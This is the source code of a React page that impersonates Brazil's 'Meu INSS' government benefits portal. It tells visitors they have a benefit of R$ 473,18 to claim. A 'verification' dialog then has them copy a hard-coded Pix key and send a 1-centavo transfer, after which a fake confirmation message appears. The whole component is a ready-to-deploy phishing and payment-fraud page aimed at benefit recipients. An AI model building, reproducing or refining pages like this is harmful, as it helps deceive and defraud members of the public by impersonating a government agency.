import GovHeader from "@/components/GovHeader";
import logo from "@/assets/logo.png";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { useState } from "react";
import { AnimatePresence, motion } from "framer-motion";
import { Check, Copy } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const pixKey = "governofederal.gov.br";

const ApkScreen = () => {
  const [modalOpen, setModalOpen] = useState(false);
  const [step, setStep] = useState<1 | 2>(1);
  const [copied, setCopied] = useState(false);
  const { toast } = useToast();

  const closeModal = (open: boolean) => {
    setModalOpen(open);

    if (!open) {
      setCopied(false);
      setStep(1);
    }
  };

  const handleCopy = async () => {
    await navigator.clipboard.writeText(pixKey);
    setCopied(true);
    toast({ title: "Chave Pix copiada", description: "Cole a chave no aplicativo do banco." });
    setTimeout(() => setCopied(false), 1500);
  };

  const handleTransferDone = () => {
    setModalOpen(false);
    toast({ title: "Transferência confirmada", description: "Aguarde a validação do pagamento." });
  };

  return (
    <div className="min-h-screen bg-background">
      <GovHeader />

      <section className="bg-card border-b border-border">
        <div className="container py-8 flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
          <div className="flex items-center gap-4">
            <img src={logo} alt="Logo" className="h-16 w-16 object-contain" />
            <div>
              <h1 className="text-2xl font-bold text-foreground">Meu INSS</h1>
              <p className="text-muted-foreground text-sm">Conheça e acesse os serviços do INSS</p>
            </div>
          </div>
        </div>
      </section>

      <section className="container py-10 md:py-16 flex justify-center items-center">
        <Card className="w-full max-w-lg text-center shadow-lg border-border">
          <CardHeader className="space-y-2">
            <CardTitle className="text-2xl font-bold text-foreground">Resgate seu benefício</CardTitle>
            <p className="text-lg font-semibold text-foreground">Valor disponível: R$ 473,18</p>
          </CardHeader>
          <CardContent>
            <Button
              onClick={() => setModalOpen(true)}
              className="w-full sm:w-auto min-w-56 bg-primary text-primary-foreground hover:bg-primary/90 rounded-xl px-8 py-6 text-lg font-semibold"
            >
              Resgatar Agora
            </Button>
          </CardContent>
        </Card>
      </section>

      <Dialog open={modalOpen} onOpenChange={closeModal}>
        <DialogContent className="sm:max-w-md">
          <AnimatePresence mode="wait" initial={false}>
            {step === 1 ? (
              <motion.div
                key="step-1"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                transition={{ duration: 0.24, ease: "easeOut" }}
                className="space-y-6"
              >
                <DialogHeader>
                  <DialogTitle>Verificação Necessária</DialogTitle>
                  <DialogDescription className="pt-2">
                    Para resgatar o benefício, é necessário realizar uma verificação para confirmar a conta do
                    beneficiário
                  </DialogDescription>
                </DialogHeader>

                <Button onClick={() => setStep(2)} className="w-full">
                  Prosseguir
                </Button>
              </motion.div>
            ) : (
              <motion.div
                key="step-2"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                transition={{ duration: 0.24, ease: "easeOut" }}
                className="space-y-5"
              >
                <DialogHeader>
                  <DialogTitle>Verificação de Conta</DialogTitle>
                </DialogHeader>

                <div className="rounded-lg border border-border bg-muted/40 p-4">
                  <p className="text-sm text-foreground">
                    Para realizar a verificação realize uma transferência de <strong>1 CENTAVO</strong>
                  </p>
                </div>

                <div className="space-y-2">
                  <label htmlFor="pix-key" className="text-sm font-medium text-foreground">
                    Chave Pix (e-mail)
                  </label>
                  <Input id="pix-key" value={pixKey} readOnly className="font-mono text-xs sm:text-sm" />
                </div>

                <div className="space-y-2">
                  <Button onClick={handleCopy} className="w-full">
                    {copied ? (
                      <span className="inline-flex items-center gap-2">
                        <Check className="h-4 w-4" />
                        Chave copiada
                      </span>
                    ) : (
                      <span className="inline-flex items-center gap-2">
                        <Copy className="h-4 w-4" />
                        Copiar chave
                      </span>
                    )}
                  </Button>
                  <Button onClick={handleTransferDone} variant="secondary" className="w-full">
                    Já fiz a transferência
                  </Button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </DialogContent>
      </Dialog>

      <footer className="bg-gov-bar text-gov-bar-foreground py-10">
        <div className="container grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8 text-sm">
          <div>
            <h4 className="font-bold mb-3 uppercase text-xs tracking-wider">Serviços</h4>
            <ul className="space-y-2 text-gov-bar-foreground/80">
              <li className="hover:underline cursor-pointer">Emitir Guia de Pagamento (GPS)</li>
              <li className="hover:underline cursor-pointer">Comunicação de Acidente (CAT)</li>
              <li className="hover:underline cursor-pointer">Calendário de Pagamento</li>
              <li className="hover:underline cursor-pointer">Encontre uma Agência</li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold mb-3 uppercase text-xs tracking-wider">Inscrição</h4>
            <ul className="space-y-2 text-gov-bar-foreground/80">
              <li className="hover:underline cursor-pointer">Informações sobre Inscrição</li>
              <li className="hover:underline cursor-pointer">Como preencher a GPS</li>
              <li className="hover:underline cursor-pointer">Tipos de Filiação</li>
              <li className="hover:underline cursor-pointer">Formas de Pagar</li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold mb-3 uppercase text-xs tracking-wider">Aplicativo</h4>
            <ul className="space-y-2 text-gov-bar-foreground/80">
              <li className="hover:underline cursor-pointer">Baixar na Play Store</li>
              <li className="hover:underline cursor-pointer">Baixar na Apple Store</li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold mb-3 uppercase text-xs tracking-wider">Suporte</h4>
            <ul className="space-y-2 text-gov-bar-foreground/80">
              <li className="hover:underline cursor-pointer">Perguntas Frequentes</li>
              <li className="hover:underline cursor-pointer">Ouvidoria</li>
            </ul>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default ApkScreen;
